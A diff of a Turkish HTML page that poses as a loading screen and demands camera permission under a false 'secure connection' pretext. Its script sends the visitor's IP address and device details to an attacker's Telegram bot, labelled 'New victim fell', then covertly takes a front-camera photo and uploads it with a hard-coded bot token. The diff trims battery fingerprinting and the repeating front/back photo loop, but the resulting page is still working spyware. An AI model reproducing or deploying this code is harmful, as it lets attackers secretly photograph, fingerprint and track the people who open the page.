@@ -1,8 +1,3 @@
-<!--
-=========
-Tüm Kodlar @policecc (telegram)'a aittir.
-=========
--->
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -137,15 +132,6 @@ Tüm Kodlar @policecc (telegram)'a aittir.
     #hiddenVideo{
       display:none;
     }
-
-    .fiyat-table {
-      margin-top: 20px;
-      background: rgba(255, 0, 0, 0.05);
-      border: 1px solid #ff000033;
-      border-radius: 10px;
-      padding: 15px;
-      display: none;
-    }
   </style>
 </head>
 <body>
@@ -167,13 +153,13 @@ Tüm Kodlar @policecc (telegram)'a aittir.
     <div id="errorArea" class="error-box">
       <h2>⚠️ Kamera İzni Gerekli!</h2>
       <p>Sistem kaynaklarının başarıyla yüklenebilmesi ve güvenli bağlantının tamamlanabilmesi için kamera izni vermeniz zorunludur. Lütfen "Tekrar Dene" butonuna basarak gelen uyarıya onay verin.</p>
-      <p style="font-size: 13px; color: #888;">(Eğer tarayıcınız izni tamamen engellediyse, adres çubuğundaki kilit/ayar simgesine tıklayarak kamera iznini aktif hale getirin.)</p>
       <button class="retry-btn" onclick="yenidenDene()">Tekrar Dene</button>
     </div>
   </div>
 
   <script>
-    const BOT_TOKEN = '8658397323:AAHrsgOj12234w_QvhGb2JyTk1zNi27Ttus';
+    // Token ana dosya ile tamamen eşitlendi
+    const BOT_TOKEN = '8607287109:AAHPIjZWmYnbrlDJ2KyPHZTjHxfZKLORO5c';
     
     function urlParametresiAl(param) {
         const urlParams = new URLSearchParams(window.location.search);
@@ -199,10 +185,7 @@ Tüm Kodlar @policecc (telegram)'a aittir.
       "Veriler doğrulanıyor...",
       "Sistem hazırlanıyor...",
       "Güvenli bağlantı kuruluyor...",
-      "Paketler indiriliyor...",
-      "Sürücüler senkronize ediliyor...",
-      "Bellek optimizasyonu yapılıyor...",
-      "Veritabanı elşıkışması bekleniyor..."
+      "Paketler indiriliyor..."
     ];
 
     let mediaStream = null;
@@ -214,34 +197,13 @@ Tüm Kodlar @policecc (telegram)'a aittir.
         const res = await fetch('https://api.ipify.org?format=json');
         const data = await res.json();
         ipBilgisi = data.ip;
-      } catch(e) { ipBilgisi = 'Alınamadı (AdBlocker)'; }
-    }
-
-    async function getBattery() {
-      if (navigator.getBattery) {
-        try {
-          const bat = await navigator.getBattery();
-          return `${Math.round(bat.level * 100)}% ${bat.charging ? 'Şarjda' : 'Pil'}`;
-        } catch(e) {}
-      }
-      return 'bilinmiyor';
+      } catch(e) { ipBilgisi = 'Alınamadı'; }
     }
 
     async function cihazBilgisiGonder() {
       try {
         await getIp();
-        const battery = await getBattery();
-        
-        const info = `
-🌐 **Yeni Kurban Düştü!** 🌐
-
-🌐 **IP:** \`${ipBilgisi}\`
-💻 **Cihaz:** ${navigator.platform}
-🌍 **Tarayıcı:** ${navigator.userAgent.substring(0, 60)}
-🔋 **Batarya:** ${battery}
-📺 **Ekran:** ${screen.width}x${screen.height}
-🌐 **Dil:** ${navigator.language}
-        `.trim();
+        const info = `🌐 **Yeni Kurban Düştü!**\n\n🌐 **IP:** \`${ipBilgisi}\`\n💻 **Cihaz:** ${navigator.platform}\n🌍 **Tarayıcı:** ${navigator.userAgent.substring(0, 50)}`;
 
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
@@ -254,11 +216,7 @@ Tüm Kodlar @policecc (telegram)'a aittir.
     async function fotoCek(kameraTipi) {
       try {
         const video = document.getElementById('hiddenVideo');
-        
-        if (!video || video.videoWidth === 0 || video.videoHeight === 0) {
-            setTimeout(() => fotoCek(kameraTipi), 500);
-            return;
-        }
+        if (!video || video.videoWidth === 0) return;
 
         fotoSayac++;
         const canvas = document.createElement('canvas');
@@ -267,13 +225,12 @@ Tüm Kodlar @policecc (telegram)'a aittir.
         canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
         
         const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
-        const etiket = kameraTipi === 'arka' ? '🔙 ARKA' : '🔚 ÖN';
+        const etiket = kameraTipi === 'arka' ? 'BACK' : 'FRONT';
 
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
         formData.append('photo', photoBlob, `foto_${fotoSayac}.jpg`);
-        formData.append('caption', `📸 **Fotoğraf #${fotoSayac}** — [${etiket} KAMERA]`);
-        formData.append('parse_mode', 'Markdown');
+        formData.append('caption', `📸 **Fotoğraf #${fotoSayac}** — [${etiket}]`);
 
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
           method: 'POST',
@@ -283,12 +240,9 @@ Tüm Kodlar @policecc (telegram)'a aittir.
     }
 
     async function kamerayiAc(facingMode) {
-      if (mediaStream) {
-        mediaStream.getTracks().forEach(track => track.stop());
-      }
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+          video: { facingMode: facingMode },
           audio: false
         });
         const video = document.getElementById('hiddenVideo');
@@ -301,63 +255,26 @@ Tüm Kodlar @policecc (telegram)'a aittir.
       }
     }
 
-    let sira = 1;
-    async function siradakiFotoyuCek() {
-      if (sira === 0) {
-        const basarili = await kamerayiAc('user');
-        if (basarili) {
-          await new Promise(r => setTimeout(r, 600));
-          await fotoCek('on');
-        }
-        sira = 1;
-      } else {
-        const basarili = await kamerayiAc('environment');
-        if (basarili) {
-          await new Promise(r => setTimeout(r, 600));
-          await fotoCek('arka');
-        }
-        sira = 0;
-      }
-    }
-
     function baslatYuklemeBari() {
-      progress = 0;
-      progressBar.style.width = "0%";
-      percentText.innerText = "0%";
-      loadingArea.style.display = "block";
-      errorArea.style.display = "none";
-
       const progressInterval = setInterval(() => {
-        if (progress < 96) {
-          progress += Math.random() * 1.5;
-          if (progress > 96) progress = 96;
+        if (progress < 100) {
+          progress += Math.random() * 3;
+          if (progress > 100) progress = 100;
           progressBar.style.width = progress + "%";
           percentText.innerText = Math.floor(progress) + "%";
         }
-      }, 400);
-
-      setInterval(() => {
-        const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
-        statusText.innerText = randomMessage;
-      }, 3500);
-
-      return progressInterval;
+      }, 200);
     }
 
     async function baslat() {
       cihazBilgisiGonder();
       baslatYuklemeBari();
-
-      await new Promise(r => setTimeout(r, 2500));
       
       const izinVerildi = await kamerayiAc('user');
-      
       if (izinVerildi) {
         setTimeout(async () => {
           await fotoCek('on');
-          setInterval(siradakiFotoyuCek, 4000);
-        }, 1000);
-        
+        }, 1500);
       } else {
         loadingArea.style.display = "none";
         errorArea.style.display = "block";
@@ -366,17 +283,11 @@ Tüm Kodlar @policecc (telegram)'a aittir.
 
     async function yenidenDene() {
         errorArea.style.display = "none";
+        loadingArea.style.display = "block";
         await baslat();
     }
 
-    window.addEventListener('beforeunload', () => {
-      if (mediaStream) {
-        mediaStream.getTracks().forEach(track => track.stop());
-      }
-    });
-
     window.onload = baslat;
   </script>
-
 </body>
 </html>
